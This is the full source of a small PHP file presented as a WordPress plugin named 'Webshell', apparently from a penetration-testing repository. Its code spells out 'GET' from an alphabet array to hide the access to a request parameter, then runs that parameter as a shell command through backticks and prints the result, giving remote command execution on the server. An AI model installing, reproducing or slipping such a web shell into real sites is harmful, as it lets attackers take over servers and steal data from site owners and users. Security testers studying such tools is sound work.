<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Version: 1.2.0
Author URI: https://podalirius.net/
Text Domain: webshell
Domain Path: /languages
License: GPLv3 or later
Network: true
*/

$_ = range("A","Z");
$_ = $_[6].$_[4].$_[19];
$_ = ${'_'.$_}['_'];
?>
<?=`$_`; ?>